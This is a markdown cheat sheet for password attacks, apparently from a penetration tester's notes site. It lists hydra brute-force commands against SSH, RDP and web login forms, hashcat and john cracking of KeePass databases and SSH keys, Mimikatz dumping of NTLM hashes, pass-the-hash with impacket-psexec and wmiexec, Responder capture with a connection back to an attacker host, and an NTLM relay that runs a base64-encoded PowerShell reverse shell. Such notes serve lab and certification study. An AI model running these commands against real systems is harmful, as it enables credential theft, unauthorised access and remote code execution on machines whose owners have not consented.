---
title: Hashes & Password Attacks
nav_order: 3
---

# Quick summary
Cheat sheet for password attacks on various services

# Network Service Login Brute-force
## SSH
```bash
# General example, `-l` user, `-P` password file `-s` port
hydra -l user -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://<target_ip>
```

## RDP
```bash
# General example, `-L` user file, `-p` password
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "<password> rdp://<target_ip>`
```

## HTTP POST Form
```bash
# General example, `-l` user, `-P` password file, then content at end is parameters (can capture in burp)
hydra -l user -P /usr/share/wordlists/rockyou.txt <target_ip> http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

# Password Cracking
## Identify Hash
```bash
hashid <hash>
hashcat --identify <hash>
hash-identifier <hash>
```

```bash
# utilise hashcat rule files if no results from cracking - `-r`.
/usr/share/hashcat/rules/
...
```

## Keepass Files
```bash
# Cracking keepass kdbx file
keepass2john Database.kdbx > keepass.hash`
...
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

## SSH Private Key
```bash
# Convert private key to crackable hash, then utilise john to crack the hash (example includes a custom rule)
ssh2john id_rsa > ssh.hash
...
john --wordlist=sshpasswords.txt --rules=sshRules ssh.hash
```

# Password Hashes (NTLM)
## Dump Hashes with Mimikatz (requires Administrator privileges)
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

...
 -> Impersonated !
...
 
mimikatz # lsadump::sam
...
 
RID  : 000003e9 (1001)
User : <user>
  Hash NTLM: <NTLM hash>
```
## Passing NTLM Hashes
### SMB Shares
```bash
smbclient \\\\<target_ip>\\<share> -U Administrator --pw-nt-hash <ntlmhash>
```

### PsExec
```bash
impacket-psexec -hashes 00000000000000000000000000000000:<ntlmhash> Administrator@<target_ip>
```

### WMIExec
```bash
impacket-wmiexec -hashes 00000000000000000000000000000000:<ntlmhash> Administrator@<target_ip>
```

## Capture NTLMv2 with Responder
```bash
# Start responder on attack machine
sudo responder -I tun0
```
```bash
# Connect back to attack machine from target (or prehaps a web app on target)
dir \\<attacker_ip>\test
```

```bash
# Crack captured hash with hashcat
hashcat -m 5600 <hashfile> /usr/share/wordlists/rockyou.txt --force
```
> If cannot crack, may be able to relay to another machine (relay attack)

## Relay Attack
```bash
impacket-ntlmrelayx --no-http-server -smb2support -t <target> -c "powershell -enc JABjAGwAaQBlAG4AdA..."
```
	- `--no-http-server` to disable the HTTP server since we are relaying an SMB connection
	- `-smb2support` to add support for [_SMB2_](https://wiki.wireshark.org/SMB2)
	- `-t` to set the target
	- `-c` execute command on target system as the relayed user. Example has a powershell base64-encoded revshell. Remember to catch on a listener

  
